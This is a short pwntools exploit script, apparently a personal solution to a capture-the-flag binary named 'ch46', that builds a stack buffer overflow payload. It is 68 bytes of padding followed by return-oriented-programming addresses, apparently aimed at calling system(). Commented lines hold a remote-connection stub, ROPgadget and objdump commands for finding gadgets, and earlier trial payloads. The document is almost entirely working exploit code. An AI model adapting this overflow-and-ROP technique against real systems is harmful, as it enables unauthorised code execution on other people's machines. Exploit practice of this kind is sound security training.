from pwn import *

payload = 'A'*68

payload += p32(0x0001055c)

payload += p32(0xb6ec93e4)

payload += p32(0x0010440)

print(payload)

#r = remote("", 6056)
#r.sendline(payload)
#r.interactive()
#python -c "print 'A'*68 + '\xb0\x05\x01\x00' + 'TTTT' + 'HHHHH'+ 'OOOO'" > /tmp/yata
#ROPgadget --binary ./ch46 | grep "mov r0"
#objdump -d testrop | grep ""
# print &system
#python -c "print 'A'*68 + '\xb0\x05\x01\x00' + 'TTTT' + 'HHHH'+ '\x5c\x05\x01\x00'+ 'OOOO'+'MMMM' + 'AAAA' + 'SSSS'" > /tmp/yata
